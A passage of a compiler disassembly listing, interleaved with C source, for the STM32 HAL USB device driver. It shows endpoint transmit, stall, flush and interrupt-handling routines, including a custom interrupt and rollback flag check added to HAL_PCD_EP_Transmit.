 8002458:	f003 0307 	and.w	r3, r3, #7
 800245c:	b2da      	uxtb	r2, r3
 800245e:	697b      	ldr	r3, [r7, #20]
 8002460:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002462:	68fb      	ldr	r3, [r7, #12]
 8002464:	681b      	ldr	r3, [r3, #0]
 8002466:	6979      	ldr	r1, [r7, #20]
 8002468:	4618      	mov	r0, r3
 800246a:	f004 fbc0 	bl	8006bee <USB_EPStartXfer>

  return HAL_OK;
 800246e:	2300      	movs	r3, #0
}
 8002470:	4618      	mov	r0, r3
 8002472:	3718      	adds	r7, #24
 8002474:	46bd      	mov	sp, r7
 8002476:	bd80      	pop	{r7, pc}

08002478 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002478:	b480      	push	{r7}
 800247a:	b083      	sub	sp, #12
 800247c:	af00      	add	r7, sp, #0
 800247e:	6078      	str	r0, [r7, #4]
 8002480:	460b      	mov	r3, r1
 8002482:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002484:	78fb      	ldrb	r3, [r7, #3]
 8002486:	f003 0207 	and.w	r2, r3, #7
 800248a:	6879      	ldr	r1, [r7, #4]
 800248c:	4613      	mov	r3, r2
 800248e:	009b      	lsls	r3, r3, #2
 8002490:	4413      	add	r3, r2
 8002492:	00db      	lsls	r3, r3, #3
 8002494:	440b      	add	r3, r1
 8002496:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 800249a:	681b      	ldr	r3, [r3, #0]
}
 800249c:	4618      	mov	r0, r3
 800249e:	370c      	adds	r7, #12
 80024a0:	46bd      	mov	sp, r7
 80024a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80024a6:	4770      	bx	lr

080024a8 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80024a8:	b580      	push	{r7, lr}
 80024aa:	b086      	sub	sp, #24
 80024ac:	af00      	add	r7, sp, #0
 80024ae:	60f8      	str	r0, [r7, #12]
 80024b0:	607a      	str	r2, [r7, #4]
 80024b2:	603b      	str	r3, [r7, #0]
 80024b4:	460b      	mov	r3, r1
 80024b6:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80024b8:	7afb      	ldrb	r3, [r7, #11]
 80024ba:	f003 0307 	and.w	r3, r3, #7
 80024be:	1c5a      	adds	r2, r3, #1
 80024c0:	4613      	mov	r3, r2
 80024c2:	009b      	lsls	r3, r3, #2
 80024c4:	4413      	add	r3, r2
 80024c6:	00db      	lsls	r3, r3, #3
 80024c8:	68fa      	ldr	r2, [r7, #12]
 80024ca:	4413      	add	r3, r2
 80024cc:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80024ce:	697b      	ldr	r3, [r7, #20]
 80024d0:	687a      	ldr	r2, [r7, #4]
 80024d2:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80024d4:	697b      	ldr	r3, [r7, #20]
 80024d6:	683a      	ldr	r2, [r7, #0]
 80024d8:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 80024da:	697b      	ldr	r3, [r7, #20]
 80024dc:	2201      	movs	r2, #1
 80024de:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 80024e2:	697b      	ldr	r3, [r7, #20]
 80024e4:	683a      	ldr	r2, [r7, #0]
 80024e6:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 80024e8:	697b      	ldr	r3, [r7, #20]
 80024ea:	2200      	movs	r2, #0
 80024ec:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 80024ee:	697b      	ldr	r3, [r7, #20]
 80024f0:	2201      	movs	r2, #1
 80024f2:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80024f4:	7afb      	ldrb	r3, [r7, #11]
 80024f6:	f003 0307 	and.w	r3, r3, #7
 80024fa:	b2da      	uxtb	r2, r3
 80024fc:	697b      	ldr	r3, [r7, #20]
 80024fe:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002500:	4b0e      	ldr	r3, [pc, #56]	; (800253c <HAL_PCD_EP_Transmit+0x94>)
 8002502:	781b      	ldrb	r3, [r3, #0]
 8002504:	f003 0302 	and.w	r3, r3, #2
 8002508:	2b00      	cmp	r3, #0
 800250a:	d102      	bne.n	8002512 <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 800250c:	4b0c      	ldr	r3, [pc, #48]	; (8002540 <HAL_PCD_EP_Transmit+0x98>)
 800250e:	2201      	movs	r2, #1
 8002510:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002512:	68fb      	ldr	r3, [r7, #12]
 8002514:	681b      	ldr	r3, [r3, #0]
 8002516:	6979      	ldr	r1, [r7, #20]
 8002518:	4618      	mov	r0, r3
 800251a:	f004 fb68 	bl	8006bee <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 800251e:	4b07      	ldr	r3, [pc, #28]	; (800253c <HAL_PCD_EP_Transmit+0x94>)
 8002520:	781b      	ldrb	r3, [r3, #0]
 8002522:	f003 0302 	and.w	r3, r3, #2
 8002526:	2b00      	cmp	r3, #0
 8002528:	d102      	bne.n	8002530 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 800252a:	4b06      	ldr	r3, [pc, #24]	; (8002544 <HAL_PCD_EP_Transmit+0x9c>)
 800252c:	2201      	movs	r2, #1
 800252e:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 8002530:	2300      	movs	r3, #0
}
 8002532:	4618      	mov	r0, r3
 8002534:	3718      	adds	r7, #24
 8002536:	46bd      	mov	sp, r7
 8002538:	bd80      	pop	{r7, pc}
 800253a:	bf00      	nop
 800253c:	2000026c 	.word	0x2000026c
 8002540:	20000270 	.word	0x20000270
 8002544:	2000027c 	.word	0x2000027c

08002548 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002548:	b580      	push	{r7, lr}
 800254a:	b084      	sub	sp, #16
 800254c:	af00      	add	r7, sp, #0
 800254e:	6078      	str	r0, [r7, #4]
 8002550:	460b      	mov	r3, r1
 8002552:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002554:	78fb      	ldrb	r3, [r7, #3]
 8002556:	f003 0207 	and.w	r2, r3, #7
 800255a:	687b      	ldr	r3, [r7, #4]
 800255c:	685b      	ldr	r3, [r3, #4]
 800255e:	429a      	cmp	r2, r3
 8002560:	d901      	bls.n	8002566 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 8002562:	2301      	movs	r3, #1
 8002564:	e04c      	b.n	8002600 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002566:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800256a:	2b00      	cmp	r3, #0
 800256c:	da0e      	bge.n	800258c <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800256e:	78fb      	ldrb	r3, [r7, #3]
 8002570:	f003 0307 	and.w	r3, r3, #7
 8002574:	1c5a      	adds	r2, r3, #1
 8002576:	4613      	mov	r3, r2
 8002578:	009b      	lsls	r3, r3, #2
 800257a:	4413      	add	r3, r2
 800257c:	00db      	lsls	r3, r3, #3
 800257e:	687a      	ldr	r2, [r7, #4]
 8002580:	4413      	add	r3, r2
 8002582:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002584:	68fb      	ldr	r3, [r7, #12]
 8002586:	2201      	movs	r2, #1
 8002588:	705a      	strb	r2, [r3, #1]
 800258a:	e00c      	b.n	80025a6 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 800258c:	78fa      	ldrb	r2, [r7, #3]
 800258e:	4613      	mov	r3, r2
 8002590:	009b      	lsls	r3, r3, #2
 8002592:	4413      	add	r3, r2
 8002594:	00db      	lsls	r3, r3, #3
 8002596:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800259a:	687a      	ldr	r2, [r7, #4]
 800259c:	4413      	add	r3, r2
 800259e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80025a0:	68fb      	ldr	r3, [r7, #12]
 80025a2:	2200      	movs	r2, #0
 80025a4:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80025a6:	68fb      	ldr	r3, [r7, #12]
 80025a8:	2201      	movs	r2, #1
 80025aa:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80025ac:	78fb      	ldrb	r3, [r7, #3]
 80025ae:	f003 0307 	and.w	r3, r3, #7
 80025b2:	b2da      	uxtb	r2, r3
 80025b4:	68fb      	ldr	r3, [r7, #12]
 80025b6:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80025b8:	687b      	ldr	r3, [r7, #4]
 80025ba:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80025be:	2b01      	cmp	r3, #1
 80025c0:	d101      	bne.n	80025c6 <HAL_PCD_EP_SetStall+0x7e>
 80025c2:	2302      	movs	r3, #2
 80025c4:	e01c      	b.n	8002600 <HAL_PCD_EP_SetStall+0xb8>
 80025c6:	687b      	ldr	r3, [r7, #4]
 80025c8:	2201      	movs	r2, #1
 80025ca:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 80025ce:	687b      	ldr	r3, [r7, #4]
 80025d0:	681b      	ldr	r3, [r3, #0]
 80025d2:	68f9      	ldr	r1, [r7, #12]
 80025d4:	4618      	mov	r0, r3
 80025d6:	f005 febb 	bl	8008350 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 80025da:	78fb      	ldrb	r3, [r7, #3]
 80025dc:	f003 0307 	and.w	r3, r3, #7
 80025e0:	2b00      	cmp	r3, #0
 80025e2:	d108      	bne.n	80025f6 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 80025e4:	687b      	ldr	r3, [r7, #4]
 80025e6:	681a      	ldr	r2, [r3, #0]
 80025e8:	687b      	ldr	r3, [r7, #4]
 80025ea:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 80025ee:	4619      	mov	r1, r3
 80025f0:	4610      	mov	r0, r2
 80025f2:	f005 fffc 	bl	80085ee <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 80025f6:	687b      	ldr	r3, [r7, #4]
 80025f8:	2200      	movs	r2, #0
 80025fa:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80025fe:	2300      	movs	r3, #0
}
 8002600:	4618      	mov	r0, r3
 8002602:	3710      	adds	r7, #16
 8002604:	46bd      	mov	sp, r7
 8002606:	bd80      	pop	{r7, pc}

08002608 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002608:	b580      	push	{r7, lr}
 800260a:	b084      	sub	sp, #16
 800260c:	af00      	add	r7, sp, #0
 800260e:	6078      	str	r0, [r7, #4]
 8002610:	460b      	mov	r3, r1
 8002612:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002614:	78fb      	ldrb	r3, [r7, #3]
 8002616:	f003 020f 	and.w	r2, r3, #15
 800261a:	687b      	ldr	r3, [r7, #4]
 800261c:	685b      	ldr	r3, [r3, #4]
 800261e:	429a      	cmp	r2, r3
 8002620:	d901      	bls.n	8002626 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 8002622:	2301      	movs	r3, #1
 8002624:	e040      	b.n	80026a8 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002626:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800262a:	2b00      	cmp	r3, #0
 800262c:	da0e      	bge.n	800264c <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800262e:	78fb      	ldrb	r3, [r7, #3]
 8002630:	f003 0307 	and.w	r3, r3, #7
 8002634:	1c5a      	adds	r2, r3, #1
 8002636:	4613      	mov	r3, r2
 8002638:	009b      	lsls	r3, r3, #2
 800263a:	4413      	add	r3, r2
 800263c:	00db      	lsls	r3, r3, #3
 800263e:	687a      	ldr	r2, [r7, #4]
 8002640:	4413      	add	r3, r2
 8002642:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002644:	68fb      	ldr	r3, [r7, #12]
 8002646:	2201      	movs	r2, #1
 8002648:	705a      	strb	r2, [r3, #1]
 800264a:	e00e      	b.n	800266a <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800264c:	78fb      	ldrb	r3, [r7, #3]
 800264e:	f003 0207 	and.w	r2, r3, #7
 8002652:	4613      	mov	r3, r2
 8002654:	009b      	lsls	r3, r3, #2
 8002656:	4413      	add	r3, r2
 8002658:	00db      	lsls	r3, r3, #3
 800265a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800265e:	687a      	ldr	r2, [r7, #4]
 8002660:	4413      	add	r3, r2
 8002662:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002664:	68fb      	ldr	r3, [r7, #12]
 8002666:	2200      	movs	r2, #0
 8002668:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 800266a:	68fb      	ldr	r3, [r7, #12]
 800266c:	2200      	movs	r2, #0
 800266e:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002670:	78fb      	ldrb	r3, [r7, #3]
 8002672:	f003 0307 	and.w	r3, r3, #7
 8002676:	b2da      	uxtb	r2, r3
 8002678:	68fb      	ldr	r3, [r7, #12]
 800267a:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800267c:	687b      	ldr	r3, [r7, #4]
 800267e:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002682:	2b01      	cmp	r3, #1
 8002684:	d101      	bne.n	800268a <HAL_PCD_EP_ClrStall+0x82>
 8002686:	2302      	movs	r3, #2
 8002688:	e00e      	b.n	80026a8 <HAL_PCD_EP_ClrStall+0xa0>
 800268a:	687b      	ldr	r3, [r7, #4]
 800268c:	2201      	movs	r2, #1
 800268e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 8002692:	687b      	ldr	r3, [r7, #4]
 8002694:	681b      	ldr	r3, [r3, #0]
 8002696:	68f9      	ldr	r1, [r7, #12]
 8002698:	4618      	mov	r0, r3
 800269a:	f005 feaa 	bl	80083f2 <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 800269e:	687b      	ldr	r3, [r7, #4]
 80026a0:	2200      	movs	r2, #0
 80026a2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80026a6:	2300      	movs	r3, #0
}
 80026a8:	4618      	mov	r0, r3
 80026aa:	3710      	adds	r7, #16
 80026ac:	46bd      	mov	sp, r7
 80026ae:	bd80      	pop	{r7, pc}

080026b0 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80026b0:	b580      	push	{r7, lr}
 80026b2:	b082      	sub	sp, #8
 80026b4:	af00      	add	r7, sp, #0
 80026b6:	6078      	str	r0, [r7, #4]
 80026b8:	460b      	mov	r3, r1
 80026ba:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80026bc:	687b      	ldr	r3, [r7, #4]
 80026be:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80026c2:	2b01      	cmp	r3, #1
 80026c4:	d101      	bne.n	80026ca <HAL_PCD_EP_Flush+0x1a>
 80026c6:	2302      	movs	r3, #2
 80026c8:	e01b      	b.n	8002702 <HAL_PCD_EP_Flush+0x52>
 80026ca:	687b      	ldr	r3, [r7, #4]
 80026cc:	2201      	movs	r2, #1
 80026ce:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 80026d2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80026d6:	2b00      	cmp	r3, #0
 80026d8:	da09      	bge.n	80026ee <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 80026da:	687b      	ldr	r3, [r7, #4]
 80026dc:	681a      	ldr	r2, [r3, #0]
 80026de:	78fb      	ldrb	r3, [r7, #3]
 80026e0:	f003 0307 	and.w	r3, r3, #7
 80026e4:	4619      	mov	r1, r3
 80026e6:	4610      	mov	r0, r2
 80026e8:	f003 fcb8 	bl	800605c <USB_FlushTxFifo>
 80026ec:	e004      	b.n	80026f8 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 80026ee:	687b      	ldr	r3, [r7, #4]
 80026f0:	681b      	ldr	r3, [r3, #0]
 80026f2:	4618      	mov	r0, r3
 80026f4:	f003 fcbe 	bl	8006074 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 80026f8:	687b      	ldr	r3, [r7, #4]
 80026fa:	2200      	movs	r2, #0
 80026fc:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002700:	2300      	movs	r3, #0
}
 8002702:	4618      	mov	r0, r3
 8002704:	3708      	adds	r7, #8
 8002706:	46bd      	mov	sp, r7
 8002708:	bd80      	pop	{r7, pc}

0800270a <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 800270a:	b580      	push	{r7, lr}
 800270c:	b096      	sub	sp, #88	; 0x58
 800270e:	af00      	add	r7, sp, #0
 8002710:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002712:	e3b1      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002714:	687b      	ldr	r3, [r7, #4]
 8002716:	681b      	ldr	r3, [r3, #0]
 8002718:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800271c:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 8002720:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002724:	b2db      	uxtb	r3, r3
 8002726:	f003 030f 	and.w	r3, r3, #15
 800272a:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 800272e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002732:	2b00      	cmp	r3, #0
 8002734:	f040 8173 	bne.w	8002a1e <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002738:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 800273c:	f003 0310 	and.w	r3, r3, #16
 8002740:	2b00      	cmp	r3, #0
 8002742:	d150      	bne.n	80027e6 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002744:	687b      	ldr	r3, [r7, #4]
 8002746:	681b      	ldr	r3, [r3, #0]
 8002748:	881b      	ldrh	r3, [r3, #0]
 800274a:	b29b      	uxth	r3, r3
 800274c:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002750:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002754:	81fb      	strh	r3, [r7, #14]
 8002756:	687b      	ldr	r3, [r7, #4]
 8002758:	681a      	ldr	r2, [r3, #0]
 800275a:	89fb      	ldrh	r3, [r7, #14]
 800275c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002760:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002764:	b29b      	uxth	r3, r3
 8002766:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002768:	687b      	ldr	r3, [r7, #4]
 800276a:	3328      	adds	r3, #40	; 0x28
 800276c:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 800276e:	687b      	ldr	r3, [r7, #4]
 8002770:	681b      	ldr	r3, [r3, #0]
 8002772:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002776:	b29b      	uxth	r3, r3
 8002778:	461a      	mov	r2, r3
 800277a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800277c:	781b      	ldrb	r3, [r3, #0]
 800277e:	00db      	lsls	r3, r3, #3
 8002780:	4413      	add	r3, r2
 8002782:	687a      	ldr	r2, [r7, #4]
 8002784:	6812      	ldr	r2, [r2, #0]
 8002786:	4413      	add	r3, r2
 8002788:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800278c:	881b      	ldrh	r3, [r3, #0]
 800278e:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002792:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002794:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 8002796:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002798:	695a      	ldr	r2, [r3, #20]
 800279a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800279c:	69db      	ldr	r3, [r3, #28]
 800279e:	441a      	add	r2, r3
 80027a0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027a2:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80027a4:	2100      	movs	r1, #0
 80027a6:	6878      	ldr	r0, [r7, #4]
 80027a8:	f00a f98f 	bl	800caca <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80027ac:	687b      	ldr	r3, [r7, #4]
 80027ae:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80027b2:	b2db      	uxtb	r3, r3
 80027b4:	2b00      	cmp	r3, #0
 80027b6:	f000 835f 	beq.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
 80027ba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027bc:	699b      	ldr	r3, [r3, #24]
 80027be:	2b00      	cmp	r3, #0
 80027c0:	f040 835a 	bne.w	8002e78 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 80027c4:	687b      	ldr	r3, [r7, #4]
 80027c6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80027ca:	b2db      	uxtb	r3, r3
 80027cc:	f063 037f 	orn	r3, r3, #127	; 0x7f
 80027d0:	b2da      	uxtb	r2, r3
 80027d2:	687b      	ldr	r3, [r7, #4]
 80027d4:	681b      	ldr	r3, [r3, #0]
 80027d6:	b292      	uxth	r2, r2
 80027d8:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 80027dc:	687b      	ldr	r3, [r7, #4]
 80027de:	2200      	movs	r2, #0
 80027e0:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80027e4:	e348      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 80027e6:	687b      	ldr	r3, [r7, #4]
 80027e8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80027ec:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 80027ee:	687b      	ldr	r3, [r7, #4]
 80027f0:	681b      	ldr	r3, [r3, #0]
 80027f2:	881b      	ldrh	r3, [r3, #0]
 80027f4:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 80027f8:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80027fc:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002800:	2b00      	cmp	r3, #0
 8002802:	d032      	beq.n	800286a <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002804:	687b      	ldr	r3, [r7, #4]
 8002806:	681b      	ldr	r3, [r3, #0]
 8002808:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800280c:	b29b      	uxth	r3, r3
 800280e:	461a      	mov	r2, r3
 8002810:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002812:	781b      	ldrb	r3, [r3, #0]
 8002814:	00db      	lsls	r3, r3, #3
 8002816:	4413      	add	r3, r2
 8002818:	687a      	ldr	r2, [r7, #4]
 800281a:	6812      	ldr	r2, [r2, #0]
 800281c:	4413      	add	r3, r2
 800281e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002822:	881b      	ldrh	r3, [r3, #0]
 8002824:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002828:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800282a:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800282c:	687b      	ldr	r3, [r7, #4]
 800282e:	6818      	ldr	r0, [r3, #0]
 8002830:	687b      	ldr	r3, [r7, #4]
 8002832:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 8002836:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002838:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 800283a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800283c:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800283e:	b29b      	uxth	r3, r3
 8002840:	f005 ff23 	bl	800868a <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002844:	687b      	ldr	r3, [r7, #4]
 8002846:	681b      	ldr	r3, [r3, #0]
 8002848:	881b      	ldrh	r3, [r3, #0]
 800284a:	b29a      	uxth	r2, r3
 800284c:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002850:	4013      	ands	r3, r2
 8002852:	823b      	strh	r3, [r7, #16]
 8002854:	687b      	ldr	r3, [r7, #4]
 8002856:	681b      	ldr	r3, [r3, #0]
 8002858:	8a3a      	ldrh	r2, [r7, #16]
 800285a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800285e:	b292      	uxth	r2, r2
 8002860:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 8002862:	6878      	ldr	r0, [r7, #4]
 8002864:	f00a f904 	bl	800ca70 <HAL_PCD_SetupStageCallback>
 8002868:	e306      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
